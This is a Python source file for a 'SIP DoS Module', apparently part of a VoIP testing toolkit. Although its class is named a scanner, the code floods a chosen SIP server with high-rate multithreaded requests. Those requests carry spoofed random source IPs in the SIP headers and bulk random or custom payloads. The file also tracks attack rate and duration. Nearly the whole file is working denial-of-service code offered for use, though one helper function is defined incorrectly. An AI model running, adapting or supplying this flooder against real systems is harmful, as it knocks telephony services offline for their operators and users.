import socket
from collections import defaultdict
import random
import string
import ssl
from tabulate import tabulate
import argparse
import ipaddress
from functions.func import generate_call_id, get_free_port, get_local_ip, random_public_ip, generate_cseq
from functions.config_parser import ConfigParser
import time
import sys
import threading
import signal
from decimal import Decimal
import struct
import os
import termios
import tty
import select

class SipServerScanner:
    def __init__(self):
        self.ip = "192.168.50.0"  # Default IP in CIDR format
        self.port = 5060
        self.responses = defaultdict(list)
        self.results = {}
        self.verbose = 2
        self.from_user = 1000
        self.proto = ''
        self.from_ip = 'random'
        self.to_user = "1000"
        self.interface_ip = ''
        self.cseq = 'method+sequence'
        self.custom_cseq = ''
        self.packet_type = 'random'
        self.cseq_counter = defaultdict(int)
        self.call_id = ''
        self.requests_sent = 0
        self.total_data = 0
        self.user_agent = "Theta 1.0"
        self.should_exit = False
        self.use_threading = True
        self.requests_sent_lock = threading.Lock()
        self.num_threads = 10
        self.payload_file = ''
        self.attack_duration = 0  # Duration in seconds, 0 means unlimited
        self.start_time = 0
        self.socket_pool = []  # Pool of reusable sockets
        self.socket_pool_size = 100  # Number of sockets to keep in pool
        self.x_header = ''  # Add x_header attribute
        self.known_packet_types = {
            'INVITE', 'REGISTER', 'OPTIONS', 'ACK', 'BYE', 'CANCEL',
            'UPDATE', 'REFER', 'PRACK', 'SUBSCRIBE', 'NOTIFY', 'PUBLISH',
            'MESSAGE', 'INFO', 'OPTIONS'
        }
        
        # Load configuration from file
        self.load_config()

    def load_config(self):
        """Load configuration from the config file"""
        config_path = os.path.join(os.path.dirname(__file__), 'config', 'config.txt')
        try:
            config_parser = ConfigParser(config_path)
            config = config_parser.parse()
            
            # Update instance attributes with config values
            self.ip = config.get('ip', self.ip)
            self.port = config_parser.get_int('port', self.port)
            self.proto = config.get('proto', self.proto)
            self.packet_type = config.get('packet_type', self.packet_type).upper()
            self.from_user = config.get('from_user', self.from_user)
            self.verbose = min(config_parser.get_int('verbose', self.verbose), 2)
            self.to_user = config.get('to_user', self.to_user)
            self.from_ip = config.get('from_ip', self.from_ip)
            self.interface_ip = config.get('interface_ip', self.interface_ip)
            self.cseq = config.get('cseq', self.cseq)
            self.custom_cseq = config.get('custom_cseq', self.custom_cseq)
            self.x_header = config.get('x_header', self.x_header)
            self.payload_file = config.get('payload_file', self.payload_file)
            self.num_threads = config_parser.get_int('num_threads', self.num_threads)
            self.attack_duration = config_parser.get_int('attack_duration', self.attack_duration)
            self.use_threading = config_parser.get_bool('use_threading', self.use_threading)
            
            if self.verbose >= 1:
                print("Configuration loaded successfully")
        except FileNotFoundError:
            print(f"Warning: Configuration file not found at {config_path}")
            print("Using default configuration values")
        except Exception as e:
            print(f"Error loading configuration: {e}")
            print("Using default configuration values")

    def parse_arguments(self):
        """Parse command line arguments - simplified to just handle start/stop"""
        parser = argparse.ArgumentParser(description='SIP Packet Crafter')
        parser.add_argument('--stop', action='store_true', help='Stop the attack')
        args = parser.parse_args()
        
        if args.stop:
            self.should_exit = True

    def get_key():
        """Get a single keypress from the terminal."""
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            if select.select([sys.stdin], [], [], 0.1)[0]:
                key = sys.stdin.read(1)
                return key
            return None
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

    def scanner(self):
        self.start_time = time.time()
        self.initialize_socket_pool()
        
        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.scan_ip, args=(self.ip,))
            thread.daemon = True
            threads.append(thread)
            thread.start()

        try:
            while not self.should_exit and (self.attack_duration == 0 or time.time() - self.start_time < self.attack_duration):
                time.sleep(0.1)  # Reduced sleep time for more responsive space bar check
                self.display_progress()
                key = get_key()
                if key:
                    # Handle the key press
                    print("\nAttack stopped by user (space bar).")
                    self.should_exit = True
                    break
        except KeyboardInterrupt:
            self.should_exit = True
        finally:
            for thread in threads:
                thread.join()
            self.cleanup_sockets()
            self.display_results()

    def signal_handler(self, signal, frame):
        print("\nScript interrupted with Ctrl+C.")
        self.should_exit = True

        # Wait for all threads to complete
        for thread in threading.enumerate():
            if thread != threading.current_thread():
                thread.join()
            self.display_results()
            sys.exit(0)

    def load_custom_payload(self):
        if self.payload_file:
            try:
                with open(self.payload_file, 'r') as payload_file:
                    return payload_file.read()
            except FileNotFoundError:
                raise FileNotFoundError(f"Payload file '{self.payload_file}' not found.")
        else:
            return ''

    def setup_socket(self):
        try:
            if self.proto == 'UDP':
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                # SO_REUSEPORT is not available on Windows
                if hasattr(socket, 'SO_REUSEPORT'):
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            elif self.proto == 'TCP':
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            else:
                raise ValueError("Invalid protocol. Supported protocols are UDP and TCP.")

            # Get local port
            local_port = get_free_port()
            
            # Use interface IP if specified, otherwise use local IP
            bind_address = self.interface_ip if self.interface_ip else get_local_ip()
            
            if self.verbose >= 2:
                print(f"Binding to IP: {bind_address}, Port: {local_port}")
            
            # Try to bind to the specified interface and port
            try:
                sock.bind((bind_address, local_port))
                return sock, local_port
            except socket.error as e:
                if self.verbose >= 2:
                    print(f"Failed to bind to {bind_address}:{local_port}: {e}")
                raise Exception(f"Could not bind to {bind_address}:{local_port}")
                
        except Exception as e:
            if self.verbose >= 2:
                print(f"Socket setup failed: {e}")
            raise

    def initialize_socket_pool(self):
        """Initialize a pool of reusable sockets"""
        for _ in range(self.socket_pool_size):
            sock, port = self.setup_socket()
            if sock:
                self.socket_pool.append((sock, port))

    def get_socket_from_pool(self):
        """Get a socket from the pool or create a new one if pool is empty"""
        if self.socket_pool:
            return self.socket_pool.pop()
        return self.setup_socket()

    def return_socket_to_pool(self, sock, port):
        """Return a socket to the pool"""
        if len(self.socket_pool) < self.socket_pool_size:
            self.socket_pool.append((sock, port))
        else:
            sock.close()
              
    def def_request_message(self, local_port):
        call_id = generate_call_id(self.call_id)
        if self.from_ip == "random":
            from_ip = random_public_ip()
        else:
            from_ip = self.from_ip

        if self.packet_type == 'RANDOM':
            packet_type = random.choice(list(self.known_packet_types))
        else:
            packet_type = self.packet_type
        
        cseq = generate_cseq(self.ip, self.packet_type, self.cseq_counter, self.cseq, self.custom_cseq)
        
        # Create a larger payload
        payload = self.load_custom_payload()
        if not payload:
            # Generate a large random payload if no custom payload
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=1000))
        
        return f"""{packet_type} sip:{self.ip} SIP/2.0\r
Via: SIP/2.0/UDP {from_ip}:{local_port};branch=z9hG4bK{call_id}\r
Max-Forwards: 70\r
From: <sip:{self.from_user}@{from_ip}>;tag={call_id}\r
To: <sip:{self.to_user}@{self.ip}>\r
Call-ID: {call_id}@{from_ip}\r
CSeq: {cseq}\r
User-Agent: {self.user_agent}\r
Contact: <sip:{self.from_user}@{from_ip}:{local_port}>\r
Content-Type: application/sdp\r
Content-Length: {len(payload)}\r
\r
{payload}
"""

    def scan_ip(self, ip):
        while not self.should_exit and (self.attack_duration == 0 or time.time() - self.start_time < self.attack_duration):
            sock, local_port = self.get_socket_from_pool()
            if not sock:
                continue

            try:
                message = self.def_request_message(local_port)
                sock.settimeout(0)
                
                if self.proto == 'UDP':
                        sock.sendto(message.encode(), (ip, self.port))
                elif self.proto == 'TCP':
                        sock.connect((ip, self.port))
                        sock.send(message.encode())
                
                with self.requests_sent_lock:
                    self.requests_sent += 1
                    self.total_data += len(message.encode())
                
            except Exception as e:
                    if self.verbose >= 2:
                        print(f"Error sending packet: {e}")
            finally:
                self.return_socket_to_pool(sock, local_port)

    def cleanup_sockets(self):
        """Clean up all sockets in the pool"""
        for sock, _ in self.socket_pool:
            try:
                    sock.close()
            except:
                pass
        self.socket_pool.clear()

    def display_progress(self):
        """Display current attack progress"""
        elapsed = time.time() - self.start_time
        rate = self.requests_sent / elapsed if elapsed > 0 else 0
        data_rate = self.total_data / elapsed if elapsed > 0 else 0
        
        # Calculate average packet size
        avg_packet_size = self.total_data / self.requests_sent if self.requests_sent > 0 else 0
        
        # Calculate estimated time remaining if duration is set
        time_remaining = ""
        if self.attack_duration > 0:
            time_remaining = f" | Time Remaining: {int(self.attack_duration - elapsed)}s"
        
        # Display detailed statistics on a single line
        stats = f"Requests: {self.requests_sent:,} | Rate: {rate:,.0f} req/s | " \
                f"Data: {self.format_bytes(self.total_data)} | Rate: {self.format_bytes(data_rate)}/s | " \
                f"Avg Packet: {self.format_bytes(avg_packet_size)}{time_remaining}"
        print(f"\r{stats}", end='', flush=True)

    @staticmethod
    def format_bytes(bytes):
        """Format bytes to human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes < 1024:
                return f"{bytes:.2f} {unit}"
            bytes /= 1024
        return f"{bytes:.2f} TB"

    def display_results(self):
        headers = ["IP address", "Port", "Proto", "Traffic Sent"]
        table_data = []

        # Calculate the total traffic sent in bytes (including headers and SIP message)
        total_traffic_sent_bytes = Decimal(self.requests_sent) * Decimal(len(self.def_request_message('')))

        # Calculate the sizes of the IP header and UDP header dynamically
        ip_header_length = len(struct.pack("!BBHHHBBH4s4s", 0x45, 0, 0, 0, 0, 0, 0, 0, b'\x00\x00\x00\x00', b'\x00\x00\x00\x00'))
        udp_header_length = 8

        # Calculate the total size of headers (IP header + UDP header) per request
        total_header_size_bytes = ip_header_length + udp_header_length

        # Calculate the size of the SIP message per request
        sip_message_size_bytes = len(self.def_request_message(''))

        # Calculate the total size of headers and SIP message per request
        total_per_request_bytes = total_header_size_bytes + sip_message_size_bytes

        # Calculate the total traffic sent including headers
        total_traffic_with_headers_bytes = total_traffic_sent_bytes + (self.requests_sent * total_header_size_bytes)

        # Define units and their corresponding multipliers
        units = ['B', 'KB', 'MB', 'GB']
        multiplier = Decimal(1024)  # Bytes to KB

        # Initialize variables for unit conversion
        unit_index = 0
        converted_traffic = total_traffic_with_headers_bytes

        # Convert total traffic to appropriate units
        while converted_traffic >= multiplier and unit_index < len(units) - 1:
            converted_traffic /= multiplier
            unit_index += 1

        # Format the total traffic sent with headers with the unit
        total_traffic_with_headers = f"{converted_traffic:.2f} {units[unit_index]}"

        table_data.append([self.ip, self.port, self.proto, total_traffic_with_headers])

        if table_data:
            print(tabulate(table_data, headers=headers, tablefmt="fancy_grid"))
        else:
            print("No results found.")

        print(f"Total requests sent: {self.requests_sent}")

    def check_for_early_exit(self):
        """Check if user pressed Enter for early exit"""
        try:
            import select
            if select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], []):
                sys.stdin.readline()
                return True
        except:
            pass
        return False

def main():
    """Main function to run the SIP DoS attack"""
    print("\n=== SIP DoS Module ===")
    print("---------------------")
    
    # Create scanner instance
    scanner = SipServerScanner()
    
    print("\nConfiguration loaded from config file")
    print("Press Enter to start the attack")
    print("Press Space to stop")
    print("---------------------")
    
    try:
        input()  # Wait for Enter key
        scanner.scanner()
    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
    except Exception as e:
        print(f"\nError during attack: {str(e)}")
    
    input("\nPress Enter to return to main menu...")

if __name__ == "__main__":
    main()

